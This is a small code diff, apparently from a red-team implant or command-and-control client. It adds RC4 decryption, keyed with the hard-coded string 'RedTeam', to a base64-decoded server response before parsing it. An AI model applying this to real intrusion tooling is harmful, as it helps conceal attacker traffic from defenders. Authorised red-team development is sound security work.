@@ -124,7 +124,9 @@ int main(int argc, char* argv[])
 
         InternetCloseHandle(hSession);
         char* DecodedResponse = b64decode(Response, Length);
-        string response = DecodedResponse;
+        DWORD NewLength = b64d_size(Length);
+        char* DecryptedResponse = (char*)RC4((char*)"RedTeam", (unsigned char*)DecodedResponse, NewLength);
+        string response = DecryptedResponse;
         response = regex_replace(response, regex("\\\\"), "");
         response = regex_replace(response, regex("\"\\["), "[");
         response = regex_replace(response, regex("\"\\{"), "{");
